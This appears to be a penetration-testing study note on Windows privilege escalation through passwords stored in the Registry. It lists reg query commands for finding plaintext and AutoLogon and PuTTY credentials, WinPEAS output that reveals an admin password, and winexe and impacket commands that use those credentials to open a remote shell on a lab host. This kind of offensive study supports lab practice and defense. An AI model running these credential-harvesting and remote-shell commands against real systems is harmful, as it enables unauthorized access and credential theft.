#windows #privesc #registry #password #cmd 

Even administrators re-use their passwords , or leave their passwords on systems in readable locations.

Windows can be especially vulnerable to this, as several features of Windows store passwords insecurely.

# Registry

Plenty of programs store configuration options in the Windows Registry.
Windows itself sometimes will store passwords in plaintext in the Registry.
It is always worth searching the Registry for passwords.

```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s
```

This usually generates a lot of results , so often it is more fruitful to look in known locations.

## 1 - Enumerate win WinPeas 

```bash
[+] Looking for AutoLogon credentials(T1012)                                       
    Some AutoLogon credentials were found!!                                       
    DefaultUserName               :  admin                                       
    DefaultPassword               :  password123
```

Some AutoLogon credentials for the Admin user and password

```bash
[+] Putty Sessions()
    SessionName: BWP123F42
    ProxyPassword: password123
    ProxyUsername: admin
```

And Putty Session and again with the username admin and the same password

We can verify manually by query the registry :

```cmd
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

And for the puTTy Session 

```cmd
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

### Spawn a shell via SMB 

```bash
winexe -U 'admin%password123' //192.168.145.182 cmd.exe
```

 With impacket 
```bash
impacket-psexec admin:password123@192.168.145.182

impacket-wmiexec admin:password123@192.168.145.182 "ipconfig"

```

Don't work




# Saved Creds

Windows has a runas command which allows users to run commands with the privileges of other users.

This usually require the knowledge of the other user's password.
However , Windows also allows users to save their credentials to the system, and these saved credentials can be used to bypass this requirement.





  